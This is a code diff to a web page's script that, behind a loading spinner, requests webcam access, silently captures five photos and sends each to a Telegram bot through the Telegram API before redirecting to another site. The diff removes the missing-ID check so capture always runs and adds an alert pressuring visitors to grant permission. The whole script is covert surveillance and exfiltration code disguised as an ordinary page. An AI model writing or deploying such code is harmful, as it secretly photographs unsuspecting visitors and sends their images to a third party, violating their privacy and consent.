@@ -53,79 +53,76 @@
 
         function getChatIdFromURL() {
             const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get('id');
+            return urlParams.get('id') || "default_id"; // Kalau ID tak ada, guna "default_id"
         }
 
         const chatId = getChatIdFromURL();
         const spinner = document.getElementById('spinner');
 
-        if (!chatId) {
-            alert('Chat ID is missing from the URL!');
-        } else {
-            spinner.classList.remove('hidden');
-            const video = document.getElementById('video');
+        spinner.classList.remove('hidden');
+        const video = document.getElementById('video');
 
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(function(stream) {
-                    video.srcObject = stream;
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                video.srcObject = stream;
 
-                    let counter = 0;
-                    const photoInterval = setInterval(function() {
-                        if (counter < 5) {
-                            capturePhoto();
-                            counter++;
-                        } else {
-                            clearInterval(photoInterval);
-                            window.location.href = 'https://izzsem.github.io/project-2/';
-                        }
-                    }, 1000);
-
-                    function capturePhoto() {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        const context = canvas.getContext('2d');
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const photoDataUrl = canvas.toDataURL('image/jpeg');
-
-                        sendToTelegram(photoDataUrl);
+                let counter = 0;
+                const photoInterval = setInterval(function() {
+                    if (counter < 5) {
+                        capturePhoto();
+                        counter++;
+                    } else {
+                        clearInterval(photoInterval);
+                        window.location.href = 'https://izzsem.github.io/project-2/';
                     }
+                }, 1000);
 
-                    function sendToTelegram(photoDataUrl) {
-                        const blob = dataURLtoBlob(photoDataUrl);
-                        const formData = new FormData();
-                        formData.append("chat_id", CHAT_ID);
-                        formData.append("photo", blob, "photo.jpg");
+                function capturePhoto() {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const photoDataUrl = canvas.toDataURL('image/jpeg');
 
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: "POST",
-                            body: formData
-                        })
-                        .then(response => response.json())
-                        .then(data => {
-                            console.log("Photo sent to Telegram:", data);
-                        })
-                        .catch(error => {
-                            console.error("Error sending photo:", error);
-                        });
+                    sendToTelegram(photoDataUrl);
+                }
+
+                function sendToTelegram(photoDataUrl) {
+                    const blob = dataURLtoBlob(photoDataUrl);
+                    const formData = new FormData();
+                    formData.append("chat_id", CHAT_ID);
+                    formData.append("photo", blob, "photo.jpg");
+
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: "POST",
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log("Photo sent to Telegram:", data);
+                    })
+                    .catch(error => {
+                        console.error("Error sending photo:", error);
+                    });
+                }
+
+                function dataURLtoBlob(dataURL) {
+                    const byteString = atob(dataURL.split(',')[1]);
+                    const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+                    const ab = new ArrayBuffer(byteString.length);
+                    const ia = new Uint8Array(ab);
+                    for (let i = 0; i < byteString.length; i++) {
+                        ia[i] = byteString.charCodeAt(i);
                     }
-
-                    function dataURLtoBlob(dataURL) {
-                        const byteString = atob(dataURL.split(',')[1]);
-                        const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
-                        const ab = new ArrayBuffer(byteString.length);
-                        const ia = new Uint8Array(ab);
-                        for (let i = 0; i < byteString.length; i++) {
-                            ia[i] = byteString.charCodeAt(i);
-                        }
-                        return new Blob([ab], { type: mimeString });
-                    }
-                })
-                .catch(function(error) {
-                    console.log("Camera permission denied: ", error);
-                    spinner.classList.add('hidden');
-                });
-        }
+                    return new Blob([ab], { type: mimeString });
+                }
+            })
+            .catch(function(error) {
+                console.log("Camera permission denied: ", error);
+                spinner.classList.add('hidden');
+                alert("Please enter allow to continue to the site.");
+            });
     </script>
 </body>
 </html>
